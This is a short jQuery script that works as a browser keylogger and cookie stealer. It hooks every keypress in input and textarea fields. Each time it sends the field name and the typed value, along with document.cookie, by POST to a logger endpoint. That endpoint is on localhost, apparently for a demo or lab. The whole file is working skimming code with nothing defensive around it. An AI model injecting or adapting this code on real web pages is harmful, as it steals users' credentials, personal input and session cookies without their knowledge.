$(document).ready(function() {
	$("input").on("keypress", function(event) {
		secretData = this.name + " ==> " + this.value;
		console.log("Input:" + this.name + " ==> " + this.value);
		$.ajax({
			type : "POST",
			url : "http://localhost:8080/logger",
			data : secretData,
			success : function() {
			},
			dataType : "text"
		});
		$.ajax({
			type : "POST",
			url : "http://localhost:8080/logger",
			data : document.cookie,
			success : function() {
			},
			dataType : "text"
		});
	});

	$("textarea").on("keypress", function(event) {
		secretData = this.name + " ==> " + this.value;
		console.log("Textarea:" + this.name + " ==> " + this.value);
		$.ajax({
			type : "POST",
			url : "http://localhost:8080/logger",
			data : secretData,
			success : function() {
			},
			dataType : "text"
		});
		$.ajax({
			type : "POST",
			url : "http://localhost:8080/logger",
			data : document.cookie,
			success : function() {
			},
			dataType : "text"
		});
	});
});